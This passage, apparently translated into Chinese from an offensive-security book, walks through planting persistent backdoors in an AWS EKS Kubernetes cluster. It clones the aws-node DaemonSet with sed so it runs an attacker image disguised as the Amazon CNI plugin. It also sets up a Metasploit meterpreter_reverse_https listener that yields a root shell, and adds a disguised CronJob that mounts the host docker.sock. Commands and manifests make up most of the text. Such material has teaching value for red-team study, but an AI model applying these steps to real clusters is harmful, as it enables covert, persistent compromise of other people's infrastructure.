
`ip-192-168-178-150.eu-west-1.compute.internal`

--snip--

我们已经选定了目标。我们的有效载荷已锁定并准备就绪。下一步是创建 DaemonSet 对象。

无需去寻找 DaemonSet 的 YAML 定义；我们只需导出合法 `aws-node` 使用的 DaemonSet，更新容器镜像字段使其指向我们自己的仓库，修改显示名称（`aws-node-cni` 而非 `aws-node`），更改容器端口以避免与现有 DaemonSet 冲突，最后添加标签选择器以匹配 `kafka-broker-collector`。在第 9-5 节中，我们重新提交修改后的文件以进行调度。

```
shell> kubectl get DaemonSet aws-node -o yaml -n kube-system > aws-ds-manifest.yaml
```

# Replace the container image with our own image

```
shell> sed -E "s/image: .* /image: 886477354405.dkr.ecr.eu-west-1.amazonaws.com/\namazon-k8s-cni:v1.5.3/g" -i aws-ds-manifest.yaml
```

# Replace the name of the DaemonSet

```
shell> sed "s/ name: aws-node/ name: aws-node-cni/g" -i aws-ds-manifest.yaml
```

# Replace the host and container port to avoid conflict

```
shell> sed -E "s/Port: [0-9]+/Port: 12711/g" -i aws-ds-manifest.yaml
```

# Update the node label key and value

```
shell> sed "s/ key: beta.kubernetes.io/os/ key: service/g" -i aws-ds-manifest.yaml
```

```
shell> sed "s/ linux/ kafka-broker-collector/g" -i aws-ds-manifest.yaml
```

### 第 9-5 节：创建我们自己的伪造 DaemonSet

经过几次 `sed` 命令后，我们的更新后的清单已准备好推送到 API 服务器。

与此同时，我们回到 Metasploit 容器，设置一个监听器，在 443 端口提供 `meterpreter_reverse_https` 类型的有效载荷，如下所示。当然，此有效载荷类型与本章开头 `msfvenom` 命令中使用的相同：

```
root@Point1:~# docker ps

CONTAINER ID   IMAGE        COMMAND

8e4adacc6e61   phocean/msf  " /bin/sh -c \"init.sh\""
```

```
root@Point1:~# docker attach 8e4adacc6e61
```

```
root@fcd4030:/opt/metasploit-framework# ./msfconsole
```

```
msf > use exploit/multi/handler
msf multi/handler> set payload linux/x64/meterpreter_reverse_https
msf multi/handler> set LPORT 443
msf multi/handler> set LHOST 0.0.0.0
msf multi/handler> set LURI /msf
```

```
msf multi/handler> set ExitOnSession false
msf multi/handler> run -j
[*] Exploit running as background job 3
```

我们将此更新后的清单推送到集群，这将创建 DaemonSet 对象以及三个反向 shell 容器：

```
shell> kubectl apply -f -n kube-system aws-ds-manifest.yaml
daemonset.apps/aws-node-cni created
```

## Metasploit 容器

```
[*] https://0.0.0.0:443 handling request from 34.244.205.187;
meterpreter > getuid
Server username: uid=0, gid=0, euid=0, egid=0
```

太棒了。节点可能会宕机，Pod 也可能被清除，但只要存在带有标签 `kafka-collector-broker` 的节点，我们的恶意容器就会一次又一次地被调度到它们上面，使我们的后门复活。毕竟，谁敢质疑明显与 EKS 集群关键组件相关的、看起来像亚马逊的 Pod 呢？以混淆取胜的安全策略可能不是一种成功的防御策略，但在进攻世界中它却是黄金法则。

注意 我们可以使用 ReplicaSet 对象而不是 DaemonSet 来实现相同的弹性。ReplicaSet 确保给定 Pod 的副本数量始终固定。我们可以配置此 ReplicaSet 以模仿 `aws-node` DaemonSet 的属性和标签。这种方法的优点是我们可以直接将 Pod 命名为 `aws-node` 而不是 `aws-node-cni`，因为它们将属于不同的 Kubernetes 对象（ReplicaSet 而非 DaemonSet）。

## 隐蔽的后门

我们稳定的后门非常有弹性，能够在节点终止后存活，但它有点吵闹。Pod 和 DaemonSet 不断运行并在集群中可见。因此，我们用一个更隐蔽、只偶尔启动的后门来补充它。

我们在集群级别设置了一个 cron 作业，每天上午 10 点运行以启动一个 Pod。我们将使用与 DaemonSet 中不同的 AWS 账户，以确保我们的后门之间不会共享数据或技术。第 9-6 节展示了该 cron 作业的清单文件。

```
apiVersion: batch/v1beta1
kind: CronJob
metadata:
  name: metrics-collect
spec:
  schedule: "0 10 * * *"
  jobTemplate:
    spec:
      template:
        spec:
          containers:
            - name: metrics-collect
              image: 882347352467.dkr.ecr.eu-west-1.amazonaws.com/amazon-metrics-collector
              volumeMounts:
                - mountPath: /var/run/docker.sock
                  name: dockersock
          volumes:
            - name: dockersock
              hostPath:
                path: /var/run/docker.sock
          restartPolicy: Never
```

### 第 9-6 节：我们隐蔽后门的 cron 作业

此 cron 作业从我们控制的另一个 AWS 账户加载 `amazon-metrics-collector` 镜像。此 Docker 镜像结构更厚，甚至可能冒充合法的指标作业（参见第 9-7 节）。

```
# Dockerfile
FROM debian:buster-slim
RUN apt update && apt install -y git make
RUN apt install -y prometheus-varnish-exporter
COPY init.sh /var/run/init.sh
ENTRYPOINT ["/var/run/init.sh"]
```
